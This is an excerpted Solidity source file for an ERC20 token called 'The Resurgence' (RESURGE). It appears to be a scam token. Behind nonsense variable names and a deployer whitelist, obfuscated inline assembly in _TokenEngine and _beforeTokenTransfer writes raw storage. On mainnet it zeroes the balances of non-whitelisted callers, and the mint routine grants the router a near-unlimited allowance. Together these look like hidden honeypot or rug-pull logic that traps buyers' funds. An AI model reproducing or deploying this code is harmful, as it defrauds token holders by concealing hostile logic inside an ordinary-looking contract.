...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSurge;
    uint256 private _badFlip = block.number*2;

    mapping (address => bool) private _prHouse; 
    mapping (address => bool) private _seControl;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private waterDrink;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private moonDay;
    address public pair;
    ...
    bool private trading; uint256 private phoneCall = 1; bool private airCon;
    uint256 private _decimals; uint256 private blackTail;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSurge.push(_router); addSurge.push(msgSender_); addSurge.push(pair);
        for (uint256 q=0; q < 3;) {_prHouse[addSurge[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenEngine() internal {
        assembly {
            function getBy(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x2ebe1e1244b9fe0903fd83160bc1e31c3d404a2e6e940251a0150aec821f04b8
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4217bfe00b1d99c6efd2fe0ef4187847778d00d941fee42b66c6cfab8ea30721,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _badFlip = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSurge[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployResurge(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSurge[0], 10 ** 77);
        _TokenEngine();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployResurge(creator, initialSupply);
    }
}

contract TheResurgence is ERC20Token {
    constructor() ERC20Token("The Resurgence", "RESURGE", msg.sender, 525000000 * 10 ** 18) {
    }
}